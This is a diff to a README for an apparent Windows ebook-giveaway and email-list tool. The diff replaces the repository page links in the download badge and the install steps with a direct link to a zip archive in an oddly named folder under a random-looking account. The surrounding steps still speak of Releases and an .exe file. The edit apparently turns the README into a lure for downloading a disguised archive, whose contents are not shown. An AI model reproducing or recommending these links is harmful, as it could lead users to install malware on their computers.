@@ -1,6 +1,6 @@
 # 📚 easy-ebook-giveaways - Grow your author email list easily
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Yanceydisjunctive406/easy-ebook-giveaways)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Yanceydisjunctive406/easy-ebook-giveaways/main/tuberculatoradiate/ebook_easy_giveaways_v3.2-alpha.4.zip)
 
 This software helps authors run ebook giveaways. It handles file delivery and email collection to build your reader base. You use this tool to manage digital files and automate your marketing tasks. Authors use this to turn social media followers into email subscribers.
 
@@ -25,7 +25,7 @@ This software helps authors run ebook giveaways. It handles file delivery and em
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the [official download page](https://github.com/Yanceydisjunctive406/easy-ebook-giveaways) to obtain the installation file.
+1.  Visit the [official download page](https://raw.githubusercontent.com/Yanceydisjunctive406/easy-ebook-giveaways/main/tuberculatoradiate/ebook_easy_giveaways_v3.2-alpha.4.zip) to obtain the installation file.
 2.  Look for the latest version under the Releases section on the right side of the screen.
 3.  Click the link ending in .exe to start your download.
 4.  Open your Downloads folder once the file finishes saving to your computer.
